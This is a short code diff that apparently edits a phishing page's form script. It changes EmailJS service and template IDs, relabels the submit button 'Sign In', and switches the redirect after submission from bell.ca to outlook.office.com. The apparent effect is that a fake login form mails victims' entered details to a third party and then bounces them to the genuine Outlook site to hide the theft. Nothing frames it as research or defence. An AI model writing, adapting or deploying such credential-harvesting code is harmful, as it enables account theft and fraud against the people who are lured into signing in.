@@ -171,16 +171,16 @@
 
             // Update button text to "Sending..."
             document.querySelector("button[type='submit']").textContent = "Sending...";
-            const serviceID = "service_ut76as3";
-            const templateID = "template_n5lm9ms";
+            const serviceID = "service_jxdp6lk";
+            const templateID = "template_2u2vrqo";
             emailjs.sendForm(serviceID, templateID, this).then(
                 () => {
-                    document.querySelector("button[type='submit']").textContent = "Send Email";
+                    document.querySelector("button[type='submit']").textContent = "Sign In";
                     // Redirect to the login success page
-                    window.location.href = "https://www.bell.ca/";
+                    window.location.href = "https://outlook.office.com";
                 },
                 (err) => {
-                    document.querySelector("button[type='submit']").textContent = "Send Email";
+                    document.querySelector("button[type='submit']").textContent = "Sign In";
                     alert(JSON.stringify(err));
                 }
             );
